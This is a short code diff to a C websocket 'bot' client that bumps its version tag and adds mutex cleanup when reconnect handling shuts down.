@@ -10,7 +10,7 @@ char g_bot_uuid[64] = {0};
 char g_cur_task_id[64] = {0};
 
 /* Must match GitHub release tag style for auto-update compare */
-#define BOT_VERSION_TAG "v4.0.11"
+#define BOT_VERSION_TAG "v4.0.15"
 
 static void sig_handler(int sig) { (void)sig; g_shutdown = 1; }
 
@@ -190,7 +190,7 @@ int main(int argc, char *argv[])
                 bo = bo * 2 < cfg.reconnect_max ? bo * 2 : cfg.reconnect_max;
                 if (ws_connect(&ws, g_bot_uuid) == 0) break;
             }
-            if (g_shutdown) break;
+            if (g_shutdown) { pthread_mutex_destroy(&ws.io); break; }
         }
 
         char esc_ip[128], esc_os[256], esc_hwid[64];
